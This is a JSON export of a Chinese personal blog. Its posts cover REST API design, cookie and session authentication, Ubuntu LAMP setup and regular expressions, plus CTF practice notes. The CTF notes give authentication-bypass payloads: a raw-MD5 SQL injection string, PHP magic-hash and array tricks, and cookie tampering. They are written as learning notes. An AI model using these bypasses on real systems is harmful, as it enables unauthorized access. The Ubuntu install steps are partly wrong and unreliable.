{"meta":{"title":"favorhau's blog","subtitle":"","description":"","author":"favorhau","url":"http://favorhau.github.io","root":"/"},"pages":[{"title":"","date":"2021-07-28T03:13:31.580Z","updated":"2021-07-28T03:13:31.519Z","comments":false,"path":"categories/index.html","permalink":"http://favorhau.github.io/categories/index.html","excerpt":"","text":""},{"title":"","date":"2021-07-29T08:57:26.273Z","updated":"2021-07-27T15:38:09.622Z","comments":false,"path":"tags/index.html","permalink":"http://favorhau.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Restful API设计规范","slug":"Restful API设计规范","date":"2021-09-07T02:46:25.000Z","updated":"2021-09-07T09:15:00.396Z","comments":true,"path":"2021/09/07/Restful API设计规范/","link":"","permalink":"http://favorhau.github.io/2021/09/07/Restful%20API%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83/","excerpt":"","text":"前言在尝试正式进行api文档编辑的过程当中，意图通过之前在写代码过程当中所积累到的接口设计经验编写一个高效清晰的api接口，但是若不经过一个api规范知识的摄取过程，效果可能不够好。在这里阅读了几份比较好的有关RestfulAPI的接口设计，结合自己的经验和风格，作出一些总结。 HTTP方法规范 查询数据使用get，创建数据使用post，更新数据使用put。 但是往往在实际的工程当中使用put方法的比较少，建议以?method=put方式使用 如: 12POST /v1/users/&lt;id&gt; //创建用户GET /v1/users/&lt;id&gt; //查询用户 资源规范 资源命名的时候需要是名词并且采用复数（尽管资源可能只有一个） 如： 1/vi/users //获取用户信息集合 获取单个用户信息数据 1/v1/users/&lt;id&gt; 在此过程当中url资源可能会层级很高，如：/v1/1/2/ 此时可以转换为别的方式查询 如 1/v1/users/?id=200121228 请求头规范Content-Type: application/json 采用json进行传输，不采用application/x-www-form-urlencoded、multipart/form-data API 返回的数据格式，不应该是纯文本，而应该是一个 JSON 对象，因为这样才能返回标准的结构化数据。所以，服务器回应的 HTTP 头的Content-Type属性要设为application/json。 客户端请求时，也要明确告诉服务器，可以接受 JSON 格式，即请求的 HTTP 头的ACCEPT属性也要设成application/json。 API规范与鉴权机制在前后端分离项目实际的接口鉴权当中，会遇到跨域的用户鉴权问题，一般通常采用以下两种方式 Token机制 cookie机制 cookie机制 cookie机制一般的流程为 1、用户向服务器发送用户名和密码。 2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。 3、服务器向用户返回一个 session_id，写入用户的 Cookie。 4、用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。 5、服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。 但这样显然服务器的扩展性不好，单机当然没有问题，如果是服务器集群，或者是跨域的服务导向架构，就要求 session 数据共享，每台服务器都能够读取 session。 服务器保持无状态扩展性会更好 因此token就出现了 在这里引入Restful Api的JWT机制 简要概括就是在params（参数）处添加一个参数token， token服务器保存一份，通常第一次请求服务器（登录）的时候产生，返回给客户端 因此客户端在后续的请求当中都需要携带上token， 1/v1/users?token=***** 用于服务器校验 token可视为令牌，服务器里面蕴含了用户信息 每次请求的时候带上token，token里面也应该蕴含过期时间信息。 其他 版本信息 版本信息可以蕴含在api接口中，如 1/v1/users 参考【1】Restful Api官网 【2】JWT机制 【3】Restful API 的设计规范-克鲁思卡尔的博客","categories":[{"name":"restful api","slug":"restful-api","permalink":"http://favorhau.github.io/categories/restful-api/"},{"name":"api","slug":"restful-api/api","permalink":"http://favorhau.github.io/categories/restful-api/api/"},{"name":"后端","slug":"restful-api/api/后端","permalink":"http://favorhau.github.io/categories/restful-api/api/%E5%90%8E%E7%AB%AF/"}],"tags":[]},{"title":"客户端认证机制","slug":"客户端认证机制","date":"2021-07-29T12:46:25.000Z","updated":"2021-07-29T13:52:18.633Z","comments":true,"path":"2021/07/29/客户端认证机制/","link":"","permalink":"http://favorhau.github.io/2021/07/29/%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/","excerpt":"","text":"写在前面写一篇这样的文章是专门针对客户端认证机制的文章，为了对之前的一些相关的验证机制进行一个总结，对有关的一些授权机制能够更熟悉。在此之前，因为cookie跟session等的问题可能会使得一些授权信息混乱，想根据自己的实际经验跟HTTP权威指南的一些指引下，做一个总结。 客户端验证机制在HTTP的请求由许多的首部组成， 比如说 reference、host，每一个首部都会包含着一种请求信息。 首部由 1key: value 这样的形式组成 在最开始的互联网世界当中，在访问互联网站点的时候第一次访问并没有记住一些数据内容， 这样使得在第二次访问的时候用户需要重新输入一些内容， 这样就会造成许多不便 那么在指定HTTP标准的时候，便想有一种机制 对用户身份进行识别， 在初期有几个识别方案 ip地址 根据ip地址对客户端进行识别验证显然不是一个好的选择，因为ip地址很容易伪造 比如说我可以通过使用代理去伪造身份，还有另外一个原因就是对于一些网络运营商，往往分配的ip是动态ip， 因此在服务器对客户端验证的时候并不能作为一个唯一的标识，对其进行识别 reference 用reference能够识别访问来源，但是同样也可以很容易进行伪造，从而使得无法对用户进行有效验证。 假设一种场景，作为一个个人用户，在访问网页的时候，我希望我的访问能够被浏览器记录下来，而不用每一次都进行用户登录，这时候cookie就为了解决需求而生 Cookie 在进行浏览器访问的时候，有一些网站会询问是否运行Cookie，除此在设置里面同时也可以禁止cookie， 浏览器可以根据用户需要将cookie存储起来，在下次访问的时候账号密码就已经为用户储存好了 上面提到的就是长期cookie 在cookie的发明制定以来，存在着两种标准。 在客户端服务器的验证过程中，由服务器向客户端发送一个set-cookie请求 在接受请求之后储存在客户端当中， 在下一次发送请求当中，客户端会带上cookie请求服务器，服务器可以根据cookie的信息再返回相关的值给客户端。 在cookie中有一个值Max-Age（版本1为Expires）用于记录cookie销毁时间，而且两个的机制不太一样，一超过授权时间， cookie就会失效，就需要重新验证。 Cookie与Session手动面试题警告 这是涉及到比较多的问题，对二者的比较也在不断 在一次DEMO的编写当中 在flask里面，只需要简单的语句即可以进行一系列验证 12from flask import Flask,request,render_template,Response, session, redirectsession[&#x27;user&#x27;] = username 那么session跟cookie二者有什么区别呢？ 在这个问题之前我想问自己一个问题 cookie如果是可读写的，并且如果是明文传输的话，那么不是会很不安全？ 在我看来，其实session机制属于cookie的一种实现 二是session往往都是加密后的数据（非明文传输），这就解决掉了许多安全上的问题。 但是本质上的不同在于 session储存在服务器上，cookie储存在客户端上 sessionmeans 会话， 一般来说，可以将session储存在服务器当中，用于识别用户状态 在我看来，session就相当于一种短暂的cookie机制 Cookie与安全在Cookie设计当中，同时也会经常出现一些安全方面的问题。 当然先肯定cookie在设计的时候使用domain解决了跨域问题，用Max-Age解决了授权时间问题， 但仍然会出现一些问题 首先cookie虽然往往是加密后的内容，但是cookie是可以更改的，并且 在许多时候，可以利用cookie进行模拟登录 甚至修改一些个人信息。 期待更深入探索客户端验证","categories":[{"name":"服务器","slug":"服务器","permalink":"http://favorhau.github.io/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"cookies","slug":"服务器/cookies","permalink":"http://favorhau.github.io/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/cookies/"}],"tags":[]},{"title":"210115CTF练习记录","slug":"210115CTF练习记录","date":"2021-01-15T14:19:45.000Z","updated":"2021-01-15T15:09:20.000Z","comments":true,"path":"2021/01/15/210115CTF练习记录/","link":"","permalink":"http://favorhau.github.io/2021/01/15/210115CTF%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"RT","text":"RT [BJDCTF2020]Easy MD5一开始查看，第一感觉有可能是弱密码碰撞。（但是后来也觉得不会那么傻逼吧，也木有密码长度的提示）尝试点击一下提交。抓取得到下面的隐藏信息 1select * from &#x27;admin&#x27; where password=md5($pass,true) 大概率是密码绕过，（根据wp）这时候有一个有一个密码ffifdyopMD5之后结果是276f722736c95d99e921722cf9ed621c，而这个字符串前几位刚好是’ or ‘6， Mysql 刚好又会把 hex 转成 ascii 解释。 12345678&lt;!--$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123; // wow, glzjin wants a girl friend.--&gt; 查看源代码是这个结果，常规的弱类型比较。 使用常用的弱类型比较 QNKCDZOMD5:0e830400451993494058024219903391s878926199a MD5:0e545993274517709034328855841020 123456789&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; md5强比较，此时如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到===强比较的值相等。构造payload 1param1[]=111&amp;param2[]=222 得到flag。。 [极客大挑战 2019]BuyFlag1Flag need your 100000000 money 有点像遇到过修改post数据包的考点，仔细看一下下面还有提示 123If you want to buy the FLAG:You must be a student from CUIT!!!You must be answer the correct password!!! 三个条件 用户身份 password money 一眼过去觉得最容易解决的就是money了，按照他的来就好。 然后关于password去看了一些源码 1234567891011&lt;!-- ~~~post money and password~~~if (isset($_POST[&#x27;password&#x27;])) &#123; $password = $_POST[&#x27;password&#x27;]; if (is_numeric($password)) &#123; echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;; &#125;elseif ($password == 404) &#123; echo &quot;Password Right!&lt;/br&gt;&quot;; &#125;&#125;--&gt; 基本上就是弱类型比较 接着的话就是用户身份（我查了一下wp才了解） 一直有定式思维用user-agent，这一次改的是cookie。 把user=0改成user=1即可。 中途还提示了money参数过长，这时候转换成科学计数法。 ，构造payload。 得到flag。","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://favorhau.github.io/tags/CTF/"}]},{"title":"CTF备忘录","slug":"CTF备忘录","date":"2021-01-15T14:19:45.000Z","updated":"2021-01-16T14:10:08.000Z","comments":true,"path":"2021/01/15/CTF备忘录/","link":"","permalink":"http://favorhau.github.io/2021/01/15/CTF%E5%A4%87%E5%BF%98%E5%BD%95/","excerpt":"CTF常用密码备忘录（持续更新）","text":"CTF常用密码备忘录（持续更新） 写在前面摘录自己学习过程当中遇到的常用CTF密码，可供以后使用。 SQL注入 ffifdyopMD5之后结果是276f722736c95d99e921722cf9ed621c，而这个字符串前几位刚好是’ or ‘6， Mysql 刚好又会把 hex 转成 ascii 解释。（mysql万能密码） QNKCDZOMD5:0e830400451993494058024219903391s878926199a MD5:0e545993274517709034328855841020（弱类型比较） https://github.com/noraj/flask-session-cookie-manager用于flask框架session伪造","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://favorhau.github.io/tags/CTF/"}]},{"title":"ubuntu下web服务器搭建","slug":"ubuntu下web服务器搭建","date":"2021-01-06T08:19:45.000Z","updated":"2021-01-06T08:22:26.000Z","comments":true,"path":"2021/01/06/ubuntu下web服务器搭建/","link":"","permalink":"http://favorhau.github.io/2021/01/06/ubuntu%E4%B8%8Bweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/","excerpt":"2021年的第一篇文章~ 关于Ubuntu下web服务器的搭建","text":"2021年的第一篇文章~ 关于Ubuntu下web服务器的搭建 Google上面的搜索联想看出应该是挺热的搜索词 写在前面Ubuntu是Linux的发行版，具有可视化的操作见面，可用作个人的小型服务器。apachehttp服务器是运用最广泛的web服务器，他提供了许多强大的功能包括动态加载模块、强大的媒体支持和广泛的集成等。 我使用了相对稳定的16.4版本。 安装Apache先更新本地文件包索引。 1sudo apt update 再键入以下命令安装apache2 1sudo apt update 这时候在浏览器打开localhost可以看到安装完毕的apache。 安装php键入一下命令 1sudo apt-get install php7.0 libapache2-mod-php7.0 再让apache重新启动 1sudo service apche2 restart 安装mysql必不可少的一部分当然是MYSQL数据库啦 1sudo apt-get install mysql-server mysql-client 安装mysql服务器和客户端。 安装phpmyadminphpmyadmin真香~phpMyAdmin是一个网络接口，通过它可以管理mysql数据库。执行 1sudo apt-get install phpmyadmin 这样查看数据表还是容易很多的。 写在后面就这样一个简易的web服务器就搭建完成了。apt好像有点有趣~","categories":[{"name":"CTF求生之路","slug":"CTF求生之路","permalink":"http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"},{"name":"教程","slug":"教程","permalink":"http://favorhau.github.io/categories/%E6%95%99%E7%A8%8B/"}],"tags":[{"name":"apache","slug":"apache","permalink":"http://favorhau.github.io/tags/apache/"},{"name":"服务器搭建","slug":"服务器搭建","permalink":"http://favorhau.github.io/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"}]},{"title":"Welcome to Regular Expression","slug":"Welcome to Regular Expression","date":"2020-12-27T14:19:45.000Z","updated":"2021-01-06T04:48:02.000Z","comments":true,"path":"2020/12/27/Welcome to Regular Expression/","link":"","permalink":"http://favorhau.github.io/2020/12/27/Welcome%20to%20Regular%20Expression/","excerpt":"欢迎来到正则表达式。","text":"欢迎来到正则表达式。 说起正则表达式，我能想到的运用似乎有很多，比方说最简单的表单验证,以及还有一些过滤等等都需要用到正则匹配。简单的示例：我们在写用户注册表单时，只允许用户名包含字符、数字、下划线和连接字符(-)，并设置用户名的长度，我们就可以使用以下正则表达式来设定。 写在前面虽然很多时候觉得在开发工程当中，只需要搬运常用的正则表达式就可以完成相关过滤，可在完成了上一天的学习之后让我觉得如果不了解正则匹配的原理，在安全的路上恐怕是行不通的，因此对正则匹配进行了相关展开。 正则基础知识在知乎上查到很好理解的方法—先从元字符开始。元字符是元字符是构造正则表达式的一种基本元素 元字符 元字符 描述 . 匹配除换行符以外的任意字符 \\w 匹配字母、数字或下划线或汉字 \\s 匹配任意空白符 \\d 匹配数字 \\b 匹配单词的开始或结束 ^ 匹配字符的开始 $ 匹配字符的结束 - 表示范围 [ ] 匹配括号中的任意一个字符 *、+、? 量词 知道一部分元字符，既可以根据元字符写简单的正则匹配。 匹配ab开头的字符串 1\\bab 匹配8位的QQ号码 1^\\d\\d\\d\\d\\d\\d\\d\\d$ 匹配手机号 1^1\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d$ 匹配银行卡号是14~18位的数字： 1^\\d&#123;14,18&#125;$ 匹配以a开头的，0个或多个b结尾的字符串 1^ab*$ 重复限定符借用知乎大佬的一幅图，总结了比较好的限定符上面的4.就是eg 匹配银行卡号是14~18位的数字： 1^\\d&#123;14,18&#125;$ 分组 正则表达式中用小括号()来做分组，也就是括号中的内容作为一个整体。eg:匹配ab 1^(ab)* 转义 如果想要匹配的正是括号，则需要转义 1^(\\(ab\\))* 断言Assertions include boundaries, which indicate the beginnings and endings of lines and words, and other patterns indicating in some way that a match is possible (including look-ahead, look-behind, and conditional expressions).来看MDN的一个eg 123456789101112131415const text = &#x27;A quick fox&#x27;;const regexpLastWord = /\\w+$/;console.log(text.match(regexpLastWord));// expected output: Array [&quot;fox&quot;]const regexpWords = /\\b\\w+\\b/g;console.log(text.match(regexpWords));// expected output: Array [&quot;A&quot;, &quot;quick&quot;, &quot;fox&quot;]const regexpFoxQuality = /\\w+(?= fox)/;console.log(text.match(regexpFoxQuality));// expected output: Array [&quot;quick&quot;] 边界类断言 字符 含义 ^ 匹配输入的开头。如果多行模式设为 true，^ 在换行符后也能立即匹配，比如 /^A/ 匹配不了 “an A” 里面的 “A”，但是可以匹配 “An A” 里面第一个 “A”。^ 出现在集合或范围开头时的含义与此不同（参见 group）。 $ 匹配输入的结束。如果多行模式设为 true，^ 在换行符前也能立即匹配，比如 /t$/ 不能匹配 “eater” 中的 “t”，但是可以匹配 “eat” 中的 “t”。 \\b 匹配一个单词的边界，这是一个字的字符前后没有另一个字的字符位置, 例如在字母和空格之间。需要注意的是匹配的单词边界不包括在匹配中。换句话说，匹配字边界的长度为零。一些例子:/\\bm/ 在 “moon” 中匹配到 “m” /oo\\b/ 在 “moon” 中不会匹配到 “oo”, 因为 “oo” 后面跟着 “n” 这个单词字符./oon\\b/ 在 “moon” 中匹配 “oon”， 因为 “oon” 是这个字符串的结尾, 因此后面没有单词字符/\\w\\b\\w/ 将永远不会匹配任何东西，因为一个单词字符后面永远不会有非单词字符和单词字符。匹配退格字符 ([\\b]). \\B 匹配非单词边界。这是上一个字符和下一个字符属于同一类型的位置：要么两者都必须是单词，要么两者都必须是非单词，例如在两个字母之间或两个空格之间。字符串的开头和结尾被视为非单词。与匹配的词边界相同，匹配的非词边界也不包含在匹配中。例如，/\\Bon/ 在 “at noon” 中匹配 “on” ，/ye\\B/ 在 “possibly yesterday”中匹配”ye” 。 其他断言 字符 含义 x(?=y) 向前断言: x 被 y 跟随时匹配 x。例如，对于/Jack(?=Sprat)/，“Jack”在跟有“Sprat”的情况下才会得到匹配．`/Jack(?=Sprat x(?!y) 向前否定断言: x 没有被 y 紧随时匹配 x。例如，对于/\\d+(?!\\。)/，数字后没有跟随小数点的情况下才会得到匹配。对于/\\d+(?!\\.)/.exec(3.141)，匹配‘141’而不是‘3’。 (?&lt;=y)x 向后断言: x 跟随 y 的情况下匹配 x。例如，对于/(?&lt;=Jack)Sprat/，“Sprat”紧随“Jack”时才会得到匹配。对于`/(?&lt;=Jack (?&lt;!y)x 向后否定断言: x 不跟随 y 时匹配 x。例如，对于/(?&lt;!-)\\d+/，数字不紧随-符号的情况下才会得到匹配。对于/(?&lt;!-)\\d+/.exec(3) ，“3”得到匹配。 而/(?&lt;!-)\\d+/.exec(-3)的结果无匹配，这是由于数字之前有-符号。 示例使用 ^匹配输入的开头。在这个例子中，我们可以通过 /^A/ 正则表达式得到以A开头的水果。为了选择合适的水果，我们可以使用带有箭头函数的过滤方法. 1234567let fruits = [&quot;Apple&quot;, &quot;Watermelon&quot;, &quot;Orange&quot;, &quot;Avocado&quot;, &quot;Strawberry&quot;];// 使用正则 /^A/ 选择以&#x27;A&#x27;开头的水果.// 这里的 &#x27;^&#x27; 只有一种含义: 匹配输入的开头.let fruitsStartsWithA = fruits.filter(fruit =&gt; /^A/.test(fruit));console.log(fruitsStartsWithA); // [ &#x27;Apple&#x27;, &#x27;Avocado&#x27; ] 组和范围 字符集 含义 `x y` [xyz][a-c] 字符集。 匹配任何一个包含的字符。您可以使用连字符来指定字符范围，但如果连字符显示为方括号中的第一个或最后一个字符，则它将被视为作为普通字符包含在字符集中的文字连字符。也可以在字符集中包含字符类。例如, [abcd] 是与[a-d].一样的，它们会 在”brisket” 中匹配 “b”,在 “chop” 中匹配 “c” .例如, [abcd-] 和[-abcd] 将会在 “brisket” 匹配 “b” , 在 “chop” 匹配 “c” , 并且匹配 “non-profit” 中的 “-“ (连字符)例如, [\\w-] 是字符集 \\w 和 “-”（连字符）的并集，与这种写法一样： [A-Za-z0-9_-].。他们都会 在 “brisket”中匹配 “b”, 在 “chop”中匹配 “c”, 在 “non-profit” 中匹配 “n”。 示例123456//计算元音字母数var aliceExcerpt = &quot;There was a long silence after this, and Alice could only hear whispers now and then.&quot;;var regexpVowels = /[aeiouy]/g;console.log(&quot;Number of vowels:&quot;, aliceExcerpt.match(regexpVowels).length);// Number of vowels: 25 写在后面学习的大部分内容源自于MDN，同时也发现了写的很通俗易懂的文字-挂一个linkhttps://github.com/ziishaned/learn-regex/有一种从看文档到实际运用还有很远的感觉 附录：正则表达式中的特殊字符摘自MDN 字符 含义 \\ 依照下列规则匹配：在非特殊字符之前的反斜杠表示下一个字符是特殊字符，不能按照字面理解。例如，前面没有 “&quot; 的 “b” 通常匹配小写字母 “b”，即字符会被作为字面理解，无论它出现在哪里。但如果前面加了 “&quot;，它将不再匹配任何字符，而是表示一个字符边界。在特殊字符之前的反斜杠表示下一个字符不是特殊字符，应该按照字面理解。详情请参阅下文中的 “转义（Escaping）” 部分。如果你想将字符串传递给 RegExp 构造函数，不要忘记在字符串字面量中反斜杠是转义字符。所以为了在模式中添加一个反斜杠，你需要在字符串字面量中转义它。/[a-z]\\s/i 和 new RegExp(&quot;[a-z]\\\\s&quot;, &quot;i&quot;) 创建了相同的正则表达式：一个用于搜索后面紧跟着空白字符（\\s 可看后文）并且在 a-z 范围内的任意字符的表达式。为了通过字符串字面量给 RegExp 构造函数创建包含反斜杠的表达式，你需要在字符串级别和正则表达式级别都对它进行转义。例如 /[a-z]:\\\\/i 和 new RegExp(&quot;[a-z]:\\\\\\\\&quot;,&quot;i&quot;) 会创建相同的表达式，即匹配类似 “C:&quot; 字符串。 ^ 匹配输入的开始。如果多行标志被设置为 true，那么也匹配换行符后紧跟的位置。例如，/^A/ 并不会匹配 “an A” 中的 ‘A’，但是会匹配 “An E” 中的 ‘A’。当 ‘^‘ 作为第一个字符出现在一个字符集合模式时，它将会有不同的含义。反向字符集合 一节有详细介绍和示例。 $ 匹配输入的结束。如果多行标志被设置为 true，那么也匹配换行符前的位置。例如，/t$/ 并不会匹配 “eater” 中的 ‘t’，但是会匹配 “eat” 中的 ‘t’。 * 匹配前一个表达式 0 次或多次。等价于 &#123;0,&#125;。例如，/bo*/ 会匹配 “A ghost boooooed” 中的 ‘booooo’ 和 “A bird warbled” 中的 ‘b’，但是在 “A goat grunted” 中不会匹配任何内容。 + 匹配前面一个表达式 1 次或者多次。等价于 &#123;1,&#125;。例如，/a+/ 会匹配 “candy” 中的 ‘a’ 和 “caaaaaaandy” 中所有的 ‘a’，但是在 “cndy” 中不会匹配任何内容。 ? 匹配前面一个表达式 0 次或者 1 次。等价于 &#123;0,1&#125;。例如，/e?le?/ 匹配 “angel” 中的 ‘el’、”angle” 中的 ‘le’ 以及 “oslo’ 中的 ‘l’。如果紧跟在任何量词 *、 +、? 或 {} 的后面，将会使量词变为非贪婪（匹配尽量少的字符），和缺省使用的贪婪模式（匹配尽可能多的字符）正好相反。例如，对 “123abc” 使用 /\\d+/ 将会匹配 “123”，而使用 /\\d+?/ 则只会匹配到 “1”。还用于先行断言中，如本表的 x(?=y) 和 x(?!y) 条目所述。 . （小数点）默认匹配除换行符之外的任何单个字符。例如，/.n/ 将会匹配 “nay, an apple is on the tree” 中的 ‘an’ 和 ‘on’，但是不会匹配 ‘nay’。如果 s (“dotAll”) 标志位被设为 true，它也会匹配换行符。 (x) 像下面的例子展示的那样，它会匹配 ‘x’ 并且记住匹配项。其中括号被称为捕获括号。模式 /(foo) (bar) \\1 \\2/ 中的 ‘(foo)‘ 和 ‘(bar)‘ 匹配并记住字符串 “foo bar foo bar” 中前两个单词。模式中的 \\1 和 \\2 表示第一个和第二个被捕获括号匹配的子字符串，即 foo 和 bar，匹配了原字符串中的后两个单词。注意 \\1、\\2、…、\\n 是用在正则表达式的匹配环节，详情可以参阅后文的 \\n 条目。而在正则表达式的替换环节，则要使用像 $1、$2、…、$n 这样的语法，例如，&#39;bar foo&#39;.replace(/(...) (...)/, &#39;$2 $1&#39;)。$&amp; 表示整个用于匹配的原字符串。 (?:x) 匹配 ‘x’ 但是不记住匹配项。这种括号叫作非捕获括号，使得你能够定义与正则表达式运算符一起使用的子表达式。看看这个例子 /(?:foo)&#123;1,2&#125;/。如果表达式是 /foo&#123;1,2&#125;/，&#123;1,2&#125; 将只应用于 ‘foo’ 的最后一个字符 ‘o’。如果使用非捕获括号，则 &#123;1,2&#125; 会应用于整个 ‘foo’ 单词。更多信息，可以参阅下文的 Using parentheses 条目. x(?=y) 匹配’x’仅仅当’x’后面跟着’y’.这种叫做先行断言。例如，/Jack(?=Sprat)/会匹配到’Jack’仅当它后面跟着’Sprat’。/Jack(?=Sprat|Frost)/匹配‘Jack’仅当它后面跟着’Sprat’或者是‘Frost’。但是‘Sprat’和‘Frost’都不是匹配结果的一部分。 (?&lt;=y)x 匹配’x’仅当’x’前面是’y’.这种叫做后行断言。例如，/(?&lt;=Jack)Sprat/会匹配到’ Sprat ‘仅仅当它前面是’ Jack ‘。/(?&lt;=Jack|Tom)Sprat/匹配‘ Sprat ’仅仅当它前面是’Jack’或者是‘Tom’。但是‘Jack’和‘Tom’都不是匹配结果的一部分。 x(?!y) 仅仅当’x’后面不跟着’y’时匹配’x’，这被称为正向否定查找。例如，仅仅当这个数字后面没有跟小数点的时候，/\\d+(?!.)/ 匹配一个数字。正则表达式/\\d+(?!.)/.exec(“3.141”)匹配‘141’而不是‘3.141’ (?&lt;!*y*)*x* 仅仅当’x’前面不是’y’时匹配’x’，这被称为反向否定查找。例如, 仅仅当这个数字前面没有负号的时候，/(?&lt;!-)\\d+/ 匹配一个数字。 /(?&lt;!-)\\d+/.exec(&#39;3&#39;) 匹配到 “3”. /(?&lt;!-)\\d+/.exec(&#39;-3&#39;) 因为这个数字前有负号，所以没有匹配到。 [`x y`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#special-or) &#123;n&#125; n 是一个正整数，匹配了前面一个字符刚好出现了 n 次。 比如， /a{2}/ 不会匹配“candy”中的’a’,但是会匹配“caandy”中所有的 a，以及“caaandy”中的前两个’a’。 &#123;n,&#125; n是一个正整数，匹配前一个字符至少出现了n次。例如, /a{2,}/ 匹配 “aa”, “aaaa” 和 “aaaaa” 但是不匹配 “a”。 &#123;n,m&#125; n 和 m 都是整数。匹配前面的字符至少n次，最多m次。如果 n 或者 m 的值是0， 这个值被忽略。例如，/a{1, 3}/ 并不匹配“cndy”中的任意字符，匹配“candy”中的a，匹配“caandy”中的前两个a，也匹配“caaaaaaandy”中的前三个a。注意，当匹配”caaaaaaandy“时，匹配的值是“aaa”，即使原始的字符串中有更多的a。 [xyz] 一个字符集合。匹配方括号中的任意字符，包括转义序列。你可以使用破折号（-）来指定一个字符范围。对于点（.）和星号（*）这样的特殊符号在一个字符集中没有特殊的意义。他们不必进行转义，不过转义也是起作用的。 例如，[abcd] 和[a-d]是一样的。他们都匹配”brisket”中的‘b’,也都匹配“city”中的‘c’。/[a-z.]+/ 和/[\\w.]+/与字符串“test.i.ng”匹配。 [^xyz] 一个反向字符集。也就是说， 它匹配任何没有包含在方括号中的字符。你可以使用破折号（-）来指定一个字符范围。任何普通字符在这里都是起作用的。例如，[^abc] 和 [^a-c] 是一样的。他们匹配”brisket”中的‘r’，也匹配“chop”中的‘h’。 [\\b] 匹配一个退格(U+0008)。（不要和\\b混淆了。） \\b 匹配一个词的边界。一个词的边界就是一个词不被另外一个“字”字符跟随的位置或者前面跟其他“字”字符的位置，例如在字母和空格之间。注意，匹配中不包括匹配的字边界。换句话说，一个匹配的词的边界的内容的长度是0。（不要和[\\b]混淆了）使用”moon”举例： /\\bm/匹配“moon”中的‘m’； /oo\\b/并不匹配”moon”中的’oo’，因为’oo’被一个“字”字符’n’紧跟着。 /oon\\b/匹配”moon”中的’oon’，因为’oon’是这个字符串的结束部分。这样他没有被一个“字”字符紧跟着。 /\\w\\b\\w/将不能匹配任何字符串，因为在一个单词中间的字符永远也不可能同时满足没有“字”字符跟随和有“字”字符跟随两种情况。注意: JavaScript的正则表达式引擎将特定的字符集定义为“字”字符。不在该集合中的任何字符都被认为是一个断词。这组字符相当有限：它只包括大写和小写的罗马字母，十进制数字和下划线字符。不幸的是，重要的字符，例如“é”或“ü”，被视为断词。 \\B 匹配一个非单词边界。匹配如下几种情况：字符串第一个字符为非“字”字符字符串最后一个字符为非“字”字符两个单词字符之间两个非单词字符之间空字符串例如，/\\B../匹配”noonday”中的’oo’, 而/y\\B../匹配”possibly yesterday”中的’yes‘ \\c*X* 当X是处于A到Z之间的字符的时候，匹配字符串中的一个控制符。例如，/\\cM/ 匹配字符串中的 control-M (U+000D)。 \\d 匹配一个数字。``等价于[0-9]。例如， /\\d/ 或者 /[0-9]/ 匹配”B2 is the suite number.”中的’2’。 \\D 匹配一个非数字字符。``等价于[^0-9]。例如， /\\D/ 或者 /[^0-9]/ 匹配”B2 is the suite number.”中的’B’ 。 \\f 匹配一个换页符 (U+000C)。 \\n 匹配一个换行符 (U+000A)。 \\r 匹配一个回车符 (U+000D)。 \\s 匹配一个空白字符，包括空格、制表符、换页符和换行符。等价于[ \\f\\n\\r\\t\\v\\u00a0\\u1680\\u180e\\u2000-\\u200a\\u2028\\u2029\\u202f\\u205f\\u3000\\ufeff]。例如, /\\s\\w*/ 匹配”foo bar.”中的’ bar’。经测试，\\s不匹配”\\u180e“，在当前版本Chrome(v80.0.3987.122)和Firefox(76.0.1)控制台输入/\\s/.test(“\\u180e”)均返回false。 \\S 匹配一个非空白字符。等价于 [^ \\f\\n\\r\\t\\v\\u00a0\\u1680\\u180e\\u2000-\\u200a\\u2028\\u2029\\u202f\\u205f\\u3000\\ufeff]。例如，/\\S\\w*/ 匹配”foo bar.”中的’foo’。 \\t 匹配一个水平制表符 (U+0009)。 \\v 匹配一个垂直制表符 (U+000B)。 \\w 匹配一个单字字符（字母、数字或者下划线）。等价于 [A-Za-z0-9_]。例如, /\\w/ 匹配 “apple,” 中的 ‘a’，”$5.28,”中的 ‘5’ 和 “3D.” 中的 ‘3’。 \\W 匹配一个非单字字符。等价于 [^A-Za-z0-9_]。例如, /\\W/ 或者 /[^A-Za-z0-9_]/ 匹配 “50%.” 中的 ‘%’。 \\*n* 在正则表达式中，它返回最后的第n个子捕获匹配的子字符串(捕获的数目以左括号计数)。比如 /apple(,)\\sorange\\1/ 匹配”apple, orange, cherry, peach.”中的’apple, orange,’ 。 \\0 匹配 NULL（U+0000）字符， 不要在这后面跟其它小数，因为 \\0&lt;digits&gt; 是一个八进制转义序列。 \\xhh 匹配一个两位十六进制数（\\x00-\\xFF）表示的字符。 \\uhhhh 匹配一个四位十六进制数表示的 UTF-16 代码单元。 \\u&#123;hhhh&#125;或\\u&#123;hhhhh&#125; 